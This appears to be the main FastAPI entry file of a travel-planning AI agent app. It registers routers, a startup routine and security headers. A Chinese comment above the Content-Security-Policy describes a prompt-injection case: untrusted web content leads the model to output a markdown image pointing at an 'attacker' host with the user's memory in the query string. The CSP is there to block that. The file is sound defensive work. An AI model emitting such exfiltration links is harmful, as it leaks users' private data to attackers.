import os

from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware
from fastapi.staticfiles import StaticFiles

from app.api.agent_api import router as agent_router
from app.api.auth_api import admin_router, router as auth_router
from app.api.chat_api import router as chat_router
from app.api.img_api import router as img_router
from app.api.immersive_api import router as immersive_router
from app.api.memory_api import router as memory_router
from app.api.sandbox_artifacts_api import router as sandbox_artifacts_router
from app.api.skill_api import router as skill_router
from app.api.staticmap_api import router as staticmap_router
from app.api.trace_api import router as trace_router
from app.api.admin_api import admin_manage_router, announce_router
from app.api.onboarding_api import router as onboarding_router
from app.api.social_api import router as social_router
from app.api.notification_api import router as notification_router
from app.api.support_api import admin_support_router, support_router
from app.api.upload_api import router as upload_router
from app.api.trip_api import router as trip_router
from app.api.trip_modules_api import router as trip_modules_router
from app.db.models import Base
from app.db.session import engine

app = FastAPI(title="17同游 Travel Agent", version="0.1.0")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["http://localhost:5173"],  # Vite dev server（生产同源，无需 CORS）
    allow_methods=["*"],
    allow_headers=["*"],
)

# Phase 69：CSP —— 攻略正文是 LLM 生成的，而 LLM 读过不可信的网页/小红书笔记。
# 没有 CSP 时，注入内容可以诱导模型输出 `![](https://attacker/?d=<用户记忆片段>)`，
# 浏览器一渲染就把数据外带了（img_api 的域名白名单被完全绕过）。
# img-src 只允许同源（图片一律走 /api/img 代理）+ data:（前端内联 favicon/占位图）。
# connect-src 'self' 断掉 fetch/XHR 外带；frame-ancestors 'none' 防点击劫持。
# 高德 JS 地图（协同行程的互动地图）必须放行的三类外部资源。2026-08-01 踩坑：
# Phase 69 收紧 CSP 时漏了它 —— JS SDK 被 script-src 拦掉 → AMapLoader.load() 报错 →
# 组件 onFail() 静默回退成静态图，于是「地图只有点、没有连线」。安全上仍然收紧：
# 只列高德自己的域名，且**不放开** connect-src 的通配（服务型接口走 nginx 反代的
# 同源 /_AMapService/，见 TripMap 的 _AMapSecurityConfig）。
# SDK 加载分好几跳，逐个都要放行（实测控制台报错逐条补齐，别凭印象只加一个域名）：
#   webapi.amap.com        主入口脚本
#   jsapi.amap.com         /web/init 鉴权（XHR → connect-src）
#   jsapi-service.amap.com WebGLRender 等渲染插件（动态 <script>）
#   *.amap.com/*.autonavi.com  瓦片与实景图
# 另外 AMap 2.0 用 blob: worker 做矢量渲染 → worker-src 必须显式给 blob:
# （不写的话回退到 script-src，而 script-src 里加 blob: 会顺带放宽整体脚本策略）。
_AMAP_SCRIPT = "https://webapi.amap.com https://vdata.amap.com https://jsapi-service.amap.com"
_AMAP_CONNECT = "https://jsapi.amap.com https://*.amap.com https://*.autonavi.com"
_AMAP_IMG = "https://*.amap.com https://*.autonavi.com https://*.is.autonavi.com"

_CSP = (
    "default-src 'self'; "
    f"img-src 'self' data: blob: {_AMAP_IMG}; "
    "media-src 'self' data: blob:; "
    # Vite 产物内联 + html2canvas；末尾是高德 JS SDK
    f"script-src 'self' 'unsafe-inline' 'unsafe-eval' {_AMAP_SCRIPT}; "
    "worker-src 'self' blob:; "
    "style-src 'self' 'unsafe-inline'; "
    "font-src 'self' data:; "
    f"connect-src 'self' {_AMAP_CONNECT}; "
    "form-action 'self'; "
    "frame-ancestors 'none'; "
    "base-uri 'self'; "
    "object-src 'none'"
)


@app.middleware("http")
async def security_headers(request, call_next):
    resp = await call_next(request)
    resp.headers.setdefault("Content-Security-Policy", _CSP)
    resp.headers.setdefault("X-Content-Type-Options", "nosniff")
    # 不能用 no-referrer：高德 JS API 靠 Referer 校验「安全域名」，剥光后一律报
    # INVALID_USER_DOMAIN，表现为地图只有点没有底图（2026-08-01 线上排查）。
    # strict-origin-when-cross-origin 只把 **origin** 发给跨源 https（路径/查询串永不外泄），
    # 降级到 http 时不发——既满足高德校验，也保住 no-referrer 想防的那部分。
    resp.headers.setdefault("Referrer-Policy", "strict-origin-when-cross-origin")
    resp.headers.setdefault("X-Frame-Options", "DENY")
    return resp

app.include_router(auth_router)
app.include_router(admin_router)
app.include_router(agent_router)
app.include_router(chat_router)
app.include_router(memory_router)
app.include_router(skill_router)
app.include_router(sandbox_artifacts_router)
app.include_router(img_router)
app.include_router(staticmap_router)
app.include_router(trace_router)
app.include_router(trip_router)
app.include_router(trip_modules_router)
app.include_router(support_router)
app.include_router(admin_support_router)
app.include_router(admin_manage_router)
app.include_router(announce_router)
app.include_router(upload_router)
app.include_router(onboarding_router)
app.include_router(social_router)
app.include_router(notification_router)
app.include_router(immersive_router)


@app.on_event("startup")
async def init_db() -> None:
    from sqlalchemy.orm import Session

    # Phase 15：建用户/会话表、给存量表加 user_id、引导 admin、旧数据归 admin
    from app.db.migrate import migrate_and_bootstrap

    migrate_and_bootstrap(engine)

    # Phase 19：池模式启动清理端口段内孤儿 chromium（上次崩溃残留，profile 会被锁）
    from app.config import settings as _settings

    if _settings.browser_pool_enabled:
        from app.tools.browser_pool import cleanup_orphans

        cleanup_orphans()

    # Phase 16：建 checkpoint 表；从 checkpoint 续跑在途对话；其余悬挂会话提示重发
    from app.agent.graph import checkpoint_setup
    from app.db.maintenance import repair_interrupted_conversations, resume_inflight_turns

    await checkpoint_setup()
    resuming = resume_inflight_turns()  # 后台线程续跑，返回正在续跑的 cid
    with Session(engine) as db:
        repair_interrupted_conversations(db, skip_cids=resuming)


@app.get("/api/health")
def health():
    return {"status": "ok"}


# 生产部署：托管前端构建产物（挂载在最后，API 路由优先匹配）
_static_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)), "static")
if os.path.isdir(_static_dir):
    app.mount("/", StaticFiles(directory=_static_dir, html=True), name="static")
